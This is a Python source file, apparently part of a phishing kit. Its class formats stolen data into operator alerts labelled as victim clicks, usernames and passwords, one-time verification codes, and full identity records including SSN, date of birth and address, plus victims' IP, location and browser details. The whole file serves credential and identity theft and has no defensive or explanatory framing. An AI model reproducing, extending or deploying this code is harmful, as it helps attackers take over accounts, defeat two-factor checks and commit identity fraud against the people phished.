
class MessageGateWay:

    def __init__(self, data):
        self.data = data

    def dispatch_message(self):

        match self.data.get("type"):
            case "credentials":
                return (
                    f"*VICTIM CLICK: {self.data.get('victim')}*\n\n"
                    f"*[USERNAME]*: `{self.data.get('username')}`\n\n"
                    f"*[VICTIM PASSWORD]*:`{self.data.get('password')}`"
                )
            case "code":
                return (
                    f"*VICTIM CLICK: {self.data.get('victim')}*\n\n"
                    f"*[VICTIM CODE]*: `{self.data.get('code')}`"
                )
            case 'bio-data':
                return (
                    f'*VICTIM INFORMATION*\n\n'
                    f"*[VICTIM CLICK: {self.data.get('victim')}]*\n\n"
                    f"*[FIRST_NAME]*: `{self.data.get('firstName')}\n`"
                    f"*[LAST_NAME]*: `{self.data.get('lastName')}\n`"
                    f"*[PHONE NUMBER]*: `{self.data.get('phoneNumber')}\n`"
                    f"*[ZIP CODE]*: `{self.data.get('zipCode')}\n`"
                    f"*[CITY]*: `{self.data.get('city')}\n`"
                    f"*[ADDRESS]*: `{self.data.get('address')}\n`"
                    f"*[DOB]*: `{self.data.get('dateOfBirth')}\n`"
                    f"*[SSN]*: `{self.data.get('ssn')}\n`"
                )
            case 'selected-verification-method':
                return (
                    f"*[VICTIM CLICK: {self.data.get('victim')}]*\n\n"
                    f"*[SELECTED VERIFICATION METHOD:]* \n\n`{self.data.get('selected_number')}`"
                )
            case 'click':
                return (
                    f"*VICTIM IN [CLICKED]:* \n\n"
                    f"*[VICTIM CLICK]*: `{self.data.get('click')['VICTIM_ID']}`\n\n"
                    f"*[BROWSER]*: `{self.data.get('click')['USER_AGENT']}\n`"
                    f"*[CITY]*: `{self.data.get('click')['CITY']}\n`"
                    f"*[COUNTRY]*: `{self.data.get('click')['COUNTRY']}\n`"
                    f"*[REGION]*: `{self.data.get('click')['REGION']}\n`"
                    f"*[IP ADDRESS]*: `{self.data.get('click')['IP']}\n`"
                    f"*[WEB DRIVER]*: `{self.data.get('click')['WEB_DRIVER']}\n`"
                )
            case _:
                return "Unknown message type"
